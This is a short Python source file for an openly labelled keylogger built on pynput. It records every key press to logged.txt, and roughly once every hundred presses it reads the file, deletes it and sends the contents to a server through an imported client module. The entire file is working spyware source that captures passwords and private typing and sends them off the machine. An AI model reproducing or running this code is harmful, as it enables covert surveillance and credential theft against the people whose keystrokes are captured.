'''
VERY BASIC KEYLOGGER! Inputs all keys and writes them to a file named logged.txt!
And then ever once in a while deletes them and sends them to server! 
'''

# From page: https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard

from pynput import keyboard
import os
import random
import client

def writeToFile(key):
	if key == None:
		return

	# Add to end of file the new key or create new file if it didn't exist
	with open("logged.txt", "a") as file:
		file.write(" " + key)



	# # On a chance of 1/10, then take the contents of the file, print and 
	# # delete the original file! This was to test if it breaks threading and
	# # it does not! If it was less than 1/10 then maybe would be worse...

	# Maybe this should be set under 100! even though expected value is 100, 
	# I just had 640 characters before sending --- a probability of ~0
	# But since then it seems fine?!
	if random.randint(1, 100) == 1:
		with open("logged.txt", "r") as file:
			content = file.read().strip()

		os.remove("logged.txt")

		client.sendMessage(content) 

def on_press(key):
	output = None
	try:
		output = format(key.char)
	except AttributeError:
		# format of key is "key.backspace" which I want to change to "BACKSPACE"
		s = format(key).partition("Key.")
		# partition creates a 3-tuple with before the target, the target, and after
		if len(s[2]) > 0:
			output = s[2].upper()
		# https://www.w3schools.com/python/ref_string_partition.asp
		
	writeToFile(output)

with keyboard.Listener(
		on_press = on_press) as listener:
	listener.join()